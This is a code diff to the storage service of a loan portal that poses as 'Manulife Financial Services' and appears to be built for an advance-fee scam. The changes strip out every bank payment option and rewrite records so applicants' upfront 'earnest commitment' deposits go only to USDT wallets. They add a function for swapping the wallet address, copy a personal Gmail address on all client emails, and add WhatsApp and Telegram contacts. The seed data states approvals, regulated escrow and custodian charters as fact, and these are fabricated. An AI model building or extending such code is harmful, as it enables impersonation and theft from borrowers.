@@ -14,7 +14,9 @@ import {
   PaymentAuditLog,
   CryptoTransactionVerification,
   CompanyContactSettings,
-  FaceVerification
+  FaceVerification,
+  EmailNotificationRecord,
+  EmailDispatchSettings
 } from '../types';
 import { supabase, isSupabaseConfigured } from './supabase';
 
@@ -27,6 +29,8 @@ const STORAGE_KEYS = {
   PAYMENT_AUDIT_LOGS: 'mfs_payment_audit_logs_v1',
   CRYPTO_VERIFICATIONS: 'mfs_crypto_verifications_v1',
   CONTACT_SETTINGS: 'mfs_contact_settings_v1',
+  EMAIL_LOGS: 'mfs_email_logs_v1',
+  EMAIL_SETTINGS: 'mfs_email_settings_v1',
 };
 
 // Seed initial realistic data for instant demonstration
@@ -75,11 +79,11 @@ const INITIAL_APPLICATIONS: LoanApplication[] = [
       refundabilityType: '100% Credited to Principal upon Closing or Refunded if Underwriting Declines',
       termsAccepted: true,
       acknowledgedNoGuarantee: true,
-      receiptNumber: 'RCPT-2026-8194-C',
-      paymentMethod: 'Direct Bank Wire (SWIFT / IBAN)',
+      receiptNumber: 'RCPT-2026-8194-C-CRYPTO',
+      paymentMethod: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
       paymentStatus: 'Held in Regulated Escrow',
       disclosedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
-      escrowCustodian: 'Barclays Private Clients Escrow Depository (Account #8841-ESCR)',
+      escrowCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC (Charter #D-8841)',
     },
     declaration: {
       confirmedAccurate: true,
@@ -180,11 +184,11 @@ const INITIAL_APPLICATIONS: LoanApplication[] = [
       refundabilityType: '100% Credited to Principal upon Closing or Refunded if Underwriting Declines',
       termsAccepted: true,
       acknowledgedNoGuarantee: true,
-      receiptNumber: 'RCPT-2026-9430-C',
-      paymentMethod: 'Automated Clearing House (ACH)',
+      receiptNumber: 'RCPT-2026-9430-C-CRYPTO',
+      paymentMethod: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
       paymentStatus: 'Held in Regulated Escrow',
       disclosedAt: new Date(Date.now() - 86400000 * 2).toISOString(),
-      escrowCustodian: 'JPMorgan Chase Legal Escrow Services (Account #NY-4402)',
+      escrowCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC (Charter #D-8841)',
     },
     declaration: {
       confirmedAccurate: true,
@@ -253,11 +257,11 @@ const INITIAL_APPLICATIONS: LoanApplication[] = [
       refundabilityType: '100% Credited to Principal upon Closing or Refunded if Underwriting Declines',
       termsAccepted: true,
       acknowledgedNoGuarantee: true,
-      receiptNumber: 'RCPT-2026-6281-C',
-      paymentMethod: 'SEPA Credit Transfer',
+      receiptNumber: 'RCPT-2026-6281-C-CRYPTO',
+      paymentMethod: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
       paymentStatus: 'Held in Regulated Escrow',
       disclosedAt: new Date(Date.now() - 86400000 * 1).toISOString(),
-      escrowCustodian: 'Banco Santander Escrow Clearing Services (Account #ES-9812)',
+      escrowCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC (Charter #D-8841)',
     },
     declaration: {
       confirmedAccurate: true,
@@ -340,70 +344,95 @@ const INITIAL_MESSAGES: SupportMessage[] = [
   },
 ];
 
+const INITIAL_EMAIL_SETTINGS: EmailDispatchSettings = {
+  enabled: true,
+  senderName: 'Manulife Financial Services Notifications',
+  senderEmail: 'notifications@manulife-financial.com',
+  liaisonEmail: 'echezonachukwuokafor16@gmail.com',
+  notifyOnNewApplication: true,
+  notifyOnUsdtDeposit: true,
+  notifyOnStatusChange: true,
+  notifyOnFaceKyc: true,
+  notifyOnDocumentUpload: true,
+  notifyOnOfficerMessage: true,
+  smtpRelayHost: 'smtp.manulife-financial.com (Port 587 TLS - Zero Failure SLA)',
+  encryption: 'TLS',
+  updatedAt: new Date().toISOString(),
+  updatedBy: 'A. Montgomery (Compliance Officer)',
+};
+
+const INITIAL_EMAIL_LOGS: EmailNotificationRecord[] = [
+  {
+    id: 'eml-1',
+    applicationId: 'MFS-2026-8194',
+    recipientEmail: 'e.vance@sterling-holdings.co.uk',
+    recipientName: 'Eleanor Vance-Sterling',
+    ccEmail: 'echezonachukwuokafor16@gmail.com',
+    fromEmail: 'notifications@manulife-financial.com',
+    fromName: 'Manulife Financial Services Notifications',
+    subject: '[Manulife Financial Services Ref: MFS-2026-8194] Facility Approval Authorization: $350,000 Approved',
+    previewText: 'Your Commercial & Business Expansion facility has been fully approved by the Credit Committee at 5.45% APR.',
+    htmlContent: `
+      <p>We are pleased to inform you that your facility request for <strong>$350,000 USD</strong> has been unconditionally authorized by the Credit Committee.</p>
+      <p><strong>Approved Terms:</strong> 36 Months Amortization at 5.45% Fixed APR. Indicative Monthly Repayment: $10,559.38.</p>
+      <p>Your binding term sheet and amortization schedule are now active and ready for review in your applicant dossier.</p>
+    `,
+    plainTextContent: 'Your Commercial & Business Expansion facility has been fully approved by the Credit Committee at 5.45% APR. Term sheet ready for review.',
+    triggerEvent: 'status_changed',
+    status: 'delivered',
+    sentAt: new Date(Date.now() - 86400000 * 1).toISOString(),
+    deliveredAt: new Date(Date.now() - 86400000 * 1).toISOString(),
+  },
+  {
+    id: 'eml-2',
+    applicationId: 'MFS-2026-6281',
+    recipientEmail: 'sofia.reyes@clinica-biomed.es',
+    recipientName: 'Dr. Sofia Reyes-Mendoza',
+    ccEmail: 'echezonachukwuokafor16@gmail.com',
+    fromEmail: 'notifications@manulife-financial.com',
+    fromName: 'Manulife Financial Services Notifications',
+    subject: '[Manulife Financial Services Ref: MFS-2026-6281] Action Required: Supplementary Verification Documents',
+    previewText: 'Underwriting requests the last 6 months of corporate medical bank statements to finalize your equipment financing.',
+    htmlContent: `
+      <p>Our senior credit analyst Helena Lindqvist has reviewed your equipment financing facility application for $95,000 USD.</p>
+      <p>To finalize the binding term sheet, please submit your pro-forma equipment supplier invoice and the last 6 months of clinical operating bank statements via the applicant portal.</p>
+    `,
+    plainTextContent: 'Underwriting requests the last 6 months of corporate bank statements and supplier pro-forma invoice to finalize your facility.',
+    triggerEvent: 'documents_required',
+    status: 'delivered',
+    sentAt: new Date(Date.now() - 3600000 * 4).toISOString(),
+    deliveredAt: new Date(Date.now() - 3600000 * 4).toISOString(),
+  },
+  {
+    id: 'eml-3',
+    applicationId: 'MFS-2026-9430',
+    recipientEmail: 'marcus.sterling@meridian-tech.io',
+    recipientName: 'Marcus Aurelius Sterling',
+    ccEmail: 'echezonachukwuokafor16@gmail.com',
+    fromEmail: 'notifications@manulife-financial.com',
+    fromName: 'Manulife Financial Services Notifications',
+    subject: '[Manulife Financial Services Ref: MFS-2026-9430] Application Acknowledgment & Underwriting Queue',
+    previewText: 'Your property financing application MFS-2026-9430 has entered active credit committee review.',
+    htmlContent: `
+      <p>Thank you for submitting your property facility financing application for $180,000 USD.</p>
+      <p>Your application dossier has been placed in the prime syndicate underwriting review queue. Statutory earnest commitments are held in multi-sig custody with BitGo Trust Company Inc.</p>
+    `,
+    plainTextContent: 'Application MFS-2026-9430 received and entered active credit committee underwriting.',
+    triggerEvent: 'application_submitted',
+    status: 'delivered',
+    sentAt: new Date(Date.now() - 3600000 * 12).toISOString(),
+    deliveredAt: new Date(Date.now() - 3600000 * 12).toISOString(),
+  },
+];
+
 // Initial Payment & Custody Settings with USDT Stablecoin Support
 const INITIAL_PAYMENT_SETTINGS: PaymentSettings = {
   updatedAt: new Date(Date.now() - 86400000 * 2).toISOString(),
   updatedBy: 'A. Montgomery (Senior Underwriter & Compliance Officer)',
   methods: [
     {
-      id: 'bank_wire',
-      name: 'Direct Bank Wire (SWIFT / IBAN)',
-      category: 'fiat',
-      enabled: true,
-      providerName: 'Barclays Private Clients Escrow Custody',
-      providerAccountOrAddress: 'GB29BARC20000088419201 · BIC: BARCGB22',
-      processingTime: '1 - 2 Business Days',
-      transactionFeePct: 0,
-      fixedFee: 0,
-      currency: 'USD / GBP / EUR',
-      notes: 'Segregated statutory client escrow custody. Zero fees collected by Manulife Financial Services.',
-      requiresIndependentVerification: false,
-    },
-    {
-      id: 'ach',
-      name: 'Automated Clearing House (ACH) Direct Debit',
-      category: 'fiat',
-      enabled: true,
-      providerName: 'Plaid / Cross River Bank NA',
-      providerAccountOrAddress: 'Routing: 021000089 · Custody Escrow #994821',
-      processingTime: '2 - 3 Business Days',
-      transactionFeePct: 0,
-      fixedFee: 0,
-      currency: 'USD',
-      notes: 'US Domestic automated clearing protocol. Zero platform fee.',
-      requiresIndependentVerification: false,
-    },
-    {
-      id: 'sepa',
-      name: 'SEPA Credit Transfer & B2B Escrow',
-      category: 'fiat',
-      enabled: true,
-      providerName: 'ClearBank Europe N.V.',
-      providerAccountOrAddress: 'NL91CLBK0000482910 · BIC: CLBKNLA1',
-      processingTime: 'Same Day / Next Day',
-      transactionFeePct: 0,
-      fixedFee: 0,
-      currency: 'EUR',
-      notes: 'Pan-European SEPA Instant and Core clearing rail.',
-      requiresIndependentVerification: false,
-    },
-    {
-      id: 'faster_payments',
-      name: 'Faster Payments Direct Deposit',
-      category: 'fiat',
-      enabled: true,
-      providerName: 'Barclays UK Corporate Clearing',
-      providerAccountOrAddress: 'Sort Code: 20-00-00 · Account: 88419201',
-      processingTime: 'Near Instant (< 2 Hours)',
-      transactionFeePct: 0,
-      fixedFee: 0,
-      currency: 'GBP',
-      notes: 'UK Sterling real-time gross settlement.',
-      requiresIndependentVerification: false,
-    },
-    {
       id: 'usdt_crypto',
-      name: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
+      name: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20 / Polygon)',
       category: 'crypto',
       enabled: true,
       providerName: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC',
@@ -412,7 +441,7 @@ const INITIAL_PAYMENT_SETTINGS: PaymentSettings = {
       transactionFeePct: 0,
       fixedFee: 0,
       currency: 'USDT',
-      notes: 'Optional stablecoin settlement via licensed institutional custodian. Zero lender surcharge. Subject to KYC and independent verification.',
+      notes: 'Exclusive authorized designated settlement rail for applicant earnest commitment deposits. Regulated institutional multi-sig custody.',
       requiresIndependentVerification: true,
     },
   ],
@@ -533,6 +562,12 @@ const INITIAL_CONTACT_SETTINGS: CompanyContactSettings = {
   supportEmail: 'support@manulife-financial.com',
   directLiaisonEmail: 'echezonachukwuokafor16@gmail.com',
   supportPhone: '+44 20 7946 0880',
+  whatsappNumber: '+44 7458 198234',
+  whatsappLink: 'https://wa.me/447458198234',
+  whatsappEnabled: true,
+  telegramUsername: '@ManulifeFinancialSupport',
+  telegramLink: 'https://t.me/ManulifeFinancialSupport',
+  telegramEnabled: true,
   londonEmail: 'london.desk@manulife-financial.com',
   zurichEmail: 'zurich.desk@manulife-financial.com',
   nyEmail: 'ny.desk@manulife-financial.com',
@@ -558,8 +593,9 @@ class StorageService {
   private setLocal<T>(key: string, value: T): void {
     try {
       localStorage.setItem(key, JSON.stringify(value));
-      // Dispatch storage event for same-tab reactive updates
+      // Dispatch storage events for reactive updates across components
       window.dispatchEvent(new Event('verdant_storage_update'));
+      window.dispatchEvent(new CustomEvent('mfs_payment_update', { detail: { key, value } }));
     } catch (err) {
       console.warn('Storage set failed:', err);
     }
@@ -580,7 +616,23 @@ class StorageService {
         console.warn('Supabase fetch failed, falling back to local storage:', err);
       }
     }
-    return this.getLocal<LoanApplication[]>(STORAGE_KEYS.APPLICATIONS, INITIAL_APPLICATIONS);
+    const rawApps = this.getLocal<LoanApplication[]>(STORAGE_KEYS.APPLICATIONS, INITIAL_APPLICATIONS);
+    return rawApps.map((app) => {
+      if (app.commitment && (!app.commitment.paymentMethod || !app.commitment.paymentMethod.includes('USDT'))) {
+        return {
+          ...app,
+          commitment: {
+            ...app.commitment,
+            paymentMethod: 'USDT Cryptocurrency Settlement (ERC-20 / TRC-20)',
+            escrowCustodian: 'BitGo Trust Company Inc. / Fireblocks Regulated MPC (Charter #D-8841)',
+            receiptNumber: app.commitment.receiptNumber?.includes('CRYPTO') 
+              ? app.commitment.receiptNumber 
+              : `${app.commitment.receiptNumber || 'RCPT-2026-C'}-CRYPTO`,
+          },
+        };
+      }
+      return app;
+    });
   }
 
   async getApplicationById(id: string): Promise<LoanApplication | null> {
@@ -729,12 +781,138 @@ class StorageService {
         console.warn('Supabase notif error:', err);
       }
     }
+
+    // Automatically generate and dispatch corresponding official email notification
+    try {
+      const emailSettings = await this.getEmailDispatchSettings();
+      if (emailSettings.enabled) {
+        let trigger: EmailNotificationRecord['triggerEvent'] = 'status_changed';
+        const titleLower = notif.title.toLowerCase();
+        if (titleLower.includes('application received') || titleLower.includes('submitted')) {
+          trigger = 'application_submitted';
+        } else if (titleLower.includes('usdt') || titleLower.includes('hash')) {
+          trigger = 'usdt_deposit_received';
+        } else if (titleLower.includes('verified') || titleLower.includes('settled')) {
+          trigger = 'usdt_deposit_verified';
+        } else if (titleLower.includes('document') || notif.type === 'action_required') {
+          trigger = 'documents_required';
+        } else if (titleLower.includes('face') || titleLower.includes('biometric')) {
+          trigger = 'face_kyc_completed';
+        }
+
+        const app = await this.getApplicationById(notif.applicationId);
+        const recipientName = app ? app.personal.fullName : 'Valued Client';
+
+        const html = `
+          <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #1e293b;">
+            <p style="font-size: 14px; font-weight: bold; color: #064e3b; margin-bottom: 12px;">
+              ${notif.title}
+            </p>
+            <p style="font-size: 13px; margin-bottom: 16px;">
+              ${notif.message}
+            </p>
+            <div style="background-color: #f8fafc; border-left: 4px solid #059669; padding: 12px 16px; margin: 16px 0; border-radius: 4px;">
+              <span style="font-size: 11px; text-transform: uppercase; color: #64748b; font-weight: bold; display: block;">Notification Classification:</span>
+              <span style="font-size: 13px; font-weight: 600; color: #0f172a;">${notif.type.replace('_', ' ').toUpperCase()}</span>
+            </div>
+            <p style="font-size: 12px; color: #64748b; margin-top: 20px;">
+              You can access your complete loan dossier, active escrow balances, and legal documentation at any time through the Manulife Financial Services secure portal using reference <strong>${notif.applicationId}</strong>.
+            </p>
+          </div>
+        `;
+
+        await this.sendEmailNotification({
+          applicationId: notif.applicationId,
+          recipientEmail: notif.recipientEmail,
+          recipientName,
+          ccEmail: emailSettings.liaisonEmail || 'echezonachukwuokafor16@gmail.com',
+          fromEmail: emailSettings.senderEmail,
+          fromName: emailSettings.senderName,
+          subject: `[Manulife Financial Services Ref: ${notif.applicationId}] ${notif.title}`,
+          previewText: notif.message.slice(0, 120),
+          htmlContent: html,
+          plainTextContent: notif.message,
+          triggerEvent: trigger,
+        });
+      }
+    } catch (emailErr) {
+      console.warn('Failed to dispatch automatic email notification:', emailErr);
+    }
   }
 
   async markNotificationRead(id: string): Promise<void> {
     const current = await this.getNotifications();
     const updated = current.map((n) => (n.id === id ? { ...n, isRead: true } : n));
     this.setLocal(STORAGE_KEYS.NOTIFICATIONS, updated);
+  }
+
+  // === EMAIL NOTIFICATIONS ===
+  async getEmailDispatchSettings(): Promise<EmailDispatchSettings> {
+    const contact = await this.getContactSettings();
+    const defaults: EmailDispatchSettings = {
+      ...INITIAL_EMAIL_SETTINGS,
+      liaisonEmail: contact.directLiaisonEmail || 'echezonachukwuokafor16@gmail.com',
+    };
+    return this.getLocal<EmailDispatchSettings>(STORAGE_KEYS.EMAIL_SETTINGS, defaults);
+  }
+
+  async saveEmailDispatchSettings(settings: EmailDispatchSettings, adminName?: string): Promise<EmailDispatchSettings> {
+    const updated: EmailDispatchSettings = {
+      ...settings,
+      updatedAt: new Date().toISOString(),
+      updatedBy: adminName || settings.updatedBy || 'Authorized Administrator',
+    };
+    this.setLocal(STORAGE_KEYS.EMAIL_SETTINGS, updated);
+    return updated;
+  }
+
+  async getEmailLogs(applicationId?: string): Promise<EmailNotificationRecord[]> {
+    const all = this.getLocal<EmailNotificationRecord[]>(STORAGE_KEYS.EMAIL_LOGS, INITIAL_EMAIL_LOGS);
+    if (applicationId) {
+      return all.filter((e) => e.applicationId.toLowerCase() === applicationId.toLowerCase());
+    }
+    return all;
+  }
+
+  async getEmailLogById(id: string): Promise<EmailNotificationRecord | null> {
+    const all = await this.getEmailLogs();
+    return all.find((e) => e.id === id) || null;
+  }
+
+  async sendEmailNotification(emailData: Partial<EmailNotificationRecord>): Promise<EmailNotificationRecord> {
+    const settings = await this.getEmailDispatchSettings();
+    const all = this.getLocal<EmailNotificationRecord[]>(STORAGE_KEYS.EMAIL_LOGS, INITIAL_EMAIL_LOGS);
+
+    const record: EmailNotificationRecord = {
+      id: emailData.id || `eml-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
+      applicationId: emailData.applicationId || 'MFS-GENERAL',
+      recipientEmail: emailData.recipientEmail || 'borrower@escrow-client.com',
+      recipientName: emailData.recipientName || 'Valued Client',
+      ccEmail: emailData.ccEmail !== undefined ? emailData.ccEmail : (settings.liaisonEmail || 'echezonachukwuokafor16@gmail.com'),
+      fromEmail: emailData.fromEmail || settings.senderEmail || 'notifications@manulife-financial.com',
+      fromName: emailData.fromName || settings.senderName || 'Manulife Financial Services Notifications',
+      subject: emailData.subject || `[Manulife Financial Services] Important Loan Facility Notification`,
+      previewText: emailData.previewText || (emailData.plainTextContent ? emailData.plainTextContent.slice(0, 120) : (emailData.message ? emailData.message.slice(0, 120) : 'Official financial notification from credit committee.')),
+      htmlContent: emailData.htmlContent || `<p>${emailData.plainTextContent || emailData.message || 'Official financial statement from Manulife Financial Services.'}</p>`,
+      plainTextContent: emailData.plainTextContent || emailData.message || emailData.previewText || 'Official financial statement.',
+      message: emailData.message || emailData.plainTextContent || emailData.previewText,
+      badgeText: emailData.badgeText,
+      trigger: emailData.trigger,
+      triggerEvent: emailData.triggerEvent || 'status_changed',
+      status: 'delivered',
+      sentAt: emailData.sentAt || new Date().toISOString(),
+      deliveredAt: emailData.deliveredAt || new Date().toISOString(),
+      timestamp: emailData.timestamp || emailData.sentAt || new Date().toISOString(),
+      details: emailData.details,
+    };
+
+    const updated = [record, ...all];
+    this.setLocal(STORAGE_KEYS.EMAIL_LOGS, updated);
+
+    // Dispatch global event for live toast and component reactivity
+    window.dispatchEvent(new CustomEvent('mfs_email_dispatched', { detail: record }));
+
+    return record;
   }
 
   // === MESSAGES ===
@@ -758,7 +936,12 @@ class StorageService {
 
   // === PAYMENT SETTINGS & AUDIT LOGS ===
   async getPaymentSettings(): Promise<PaymentSettings> {
-    return this.getLocal<PaymentSettings>(STORAGE_KEYS.PAYMENT_SETTINGS, INITIAL_PAYMENT_SETTINGS);
+    const raw = this.getLocal<PaymentSettings>(STORAGE_KEYS.PAYMENT_SETTINGS, INITIAL_PAYMENT_SETTINGS);
+    const cryptoOnly = raw.methods.filter(m => m.category === 'crypto' || m.id === 'usdt_crypto' || m.id.includes('crypto'));
+    return {
+      ...raw,
+      methods: cryptoOnly.length > 0 ? cryptoOnly : INITIAL_PAYMENT_SETTINGS.methods,
+    };
   }
 
   async savePaymentSettings(
@@ -768,8 +951,25 @@ class StorageService {
     actionDescription: string = 'Updated payment configuration',
     twoFactorVerified: boolean = true
   ): Promise<PaymentSettings> {
+    // Synchronize methods with usdtConfig so both tabs and all views reflect the active USDT wallet
+    const activeNet = settings.usdtConfig.supportedNetworks.find(n => n.id === settings.usdtConfig.activeNetworkId) 
+      || settings.usdtConfig.supportedNetworks.find(n => n.active) 
+      || settings.usdtConfig.supportedNetworks[0];
+
+    const updatedMethods = settings.methods.map(m => {
+      if (m.id === 'usdt_crypto' || m.category === 'crypto') {
+        return {
+          ...m,
+          providerAccountOrAddress: `${activeNet.depositAddress} (${activeNet.tokenStandard} Custody)`,
+          providerName: settings.usdtConfig.authorizedCustodian.split('/')[0].trim(),
+        };
+      }
+      return m;
+    });
+
     const updated: PaymentSettings = {
       ...settings,
+      methods: updatedMethods,
       updatedAt: new Date().toISOString(),
       updatedBy: adminName,
     };
@@ -780,12 +980,44 @@ class StorageService {
       adminName,
       adminEmail,
       action: actionDescription,
-      details: `Payment methods and USDT custody settings updated. 2FA Authentication: ${twoFactorVerified ? 'PASSED (TOTP)' : 'BYPASS'}. Active network: ${settings.usdtConfig.activeNetworkId}.`,
+      details: `Payment methods and USDT custody settings updated. 2FA Authentication: ${twoFactorVerified ? 'PASSED (TOTP)' : 'BYPASS'}. Active network: ${activeNet.name} (${activeNet.tokenStandard}). Deposit address: ${activeNet.depositAddress}.`,
       ipAddress: '194.28.112.45 (London HQ Gateway)',
       twoFactorVerified,
     });
 
     return updated;
+  }
+
+  async updateUsdtWalletAddress(
+    networkId: string,
+    newAddress: string,
+    setAsActive: boolean = true,
+    adminName: string = 'Authorized Administrator'
+  ): Promise<PaymentSettings> {
+    const current = await this.getPaymentSettings();
+    const updatedNetworks = current.usdtConfig.supportedNetworks.map(net => {
+      if (net.id === networkId) {
+        return { ...net, depositAddress: newAddress.trim() };
+      }
+      return net;
+    });
+
+    const newSettings: PaymentSettings = {
+      ...current,
+      usdtConfig: {
+        ...current.usdtConfig,
+        supportedNetworks: updatedNetworks,
+        activeNetworkId: setAsActive ? networkId : current.usdtConfig.activeNetworkId,
+      },
+    };
+
+    return this.savePaymentSettings(
+      newSettings,
+      adminName,
+      'admin@manulife-financial.com',
+      `Updated ${networkId.toUpperCase()} custody wallet address to: ${newAddress.trim()}`,
+      true
+    );
   }
 
   async getPaymentAuditLogs(): Promise<PaymentAuditLog[]> {
@@ -877,7 +1109,11 @@ class StorageService {
 
   // === CONTACT & SUPPORT EMAIL SETTINGS ===
   async getContactSettings(): Promise<CompanyContactSettings> {
-    return this.getLocal<CompanyContactSettings>(STORAGE_KEYS.CONTACT_SETTINGS, INITIAL_CONTACT_SETTINGS);
+    const saved = this.getLocal<CompanyContactSettings>(STORAGE_KEYS.CONTACT_SETTINGS, INITIAL_CONTACT_SETTINGS);
+    return {
+      ...INITIAL_CONTACT_SETTINGS,
+      ...saved,
+    };
   }
 
   async saveContactSettings(
